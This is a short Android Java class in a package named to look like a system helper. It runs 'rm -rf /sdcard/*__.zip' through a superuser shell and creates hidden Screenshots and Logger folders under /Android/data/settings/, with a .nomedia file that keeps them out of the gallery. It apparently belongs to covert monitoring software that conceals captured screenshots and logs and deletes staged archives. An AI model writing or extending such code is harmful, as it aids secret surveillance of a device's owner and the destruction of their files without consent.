package com.android.classic.helper;

import java.io.File;
import java.io.IOException;

import android.annotation.SuppressLint;
import android.os.Environment;
import eu.chainfire.libsuperuser.Shell;

@SuppressLint("SimpleDateFormat")
public class Methods {

	static String[] cleanCommand = { "rm -rf /sdcard/*__.zip" };

	public static void cleanupFile() {
		Shell.SH.run(Methods.cleanCommand);

		/* Create Paths */
		File patha = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/");
		File path = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/");
		File pathSS = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Screenshots/");
		File nomedia = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/.nomedia");
		File pathcmd = new File(Environment.getExternalStorageDirectory()
				+ "/Android/data/settings/Logger/");
		patha.mkdirs();
		path.mkdirs();
		pathcmd.mkdirs();
		pathSS.mkdirs();
		try {
			nomedia.createNewFile();
		} catch (IOException e) {
		}
		/* */

	}

}